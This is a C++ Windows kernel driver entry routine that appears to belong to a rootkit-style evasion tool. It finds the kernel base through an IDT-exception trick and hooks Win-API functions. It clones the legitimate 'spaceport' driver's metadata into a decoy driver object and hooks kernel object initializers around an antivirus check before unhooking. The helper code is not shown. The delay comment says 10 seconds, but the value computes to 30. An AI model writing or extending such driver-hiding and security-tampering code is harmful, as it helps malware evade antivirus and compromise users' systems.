#include "includes.h"
#include "modules.h"
#include "log.h"
#include "hooks.h"


extern "C" NTSTATUS DriverEntry() {

		auto status = STATUS_SUCCESS;

		// Driver Load
		Logger::Print( Logger::Level::Info, "Entry Called" );

		// Define runtime vars
		uintptr_t base{};

		object_type* obj{ nullptr };

		PDRIVER_OBJECT tar_obj{};

		PDRIVER_OBJECT fakeDriver{};

		size_t size{};

		// Init Funcion Pointer Table
		func_pointer_table table_handle = { 0 };

		// Find NTOSKRNL Base
		status = modules::throw_idt_exception( base, size );

		// Find and save pointer info for WIN-API functions
		hooks::hook_win_API( base, size, table_handle );

		// Find and expose a legit Windows driver to copy its metadata to our dummy
		modules::get_driver_object( L"\\Driver\\spaceport", tar_obj, table_handle );

		// Create the Fake Driver Object purely to be used as a decoy
		PDRIVER_OBJECT fake_obj = modules::AllocateFakeDriverObject( tar_obj, fakeDriver );

		//Hook obj initializers in preperation for AV check
		hooks::capture_initalizer_table( base, size, table_handle, obj, 1 );

		LARGE_INTEGER delay;
		delay.QuadPart = -10LL * 1000 * 1000 * 30; // 10 seconds
		KeDelayExecutionThread( KernelMode, FALSE, &delay );

		//Unook obj initializers in preperation for driver unload
		hooks::capture_initalizer_table( base, size, table_handle, obj, 0 );

		// Clean dummy object
		modules::DeallocateFakeDriverObject( fake_obj );

		// Driver Unload
		Logger::Print( Logger::Level::Info, "Driver Unload" );

		return status;
	
}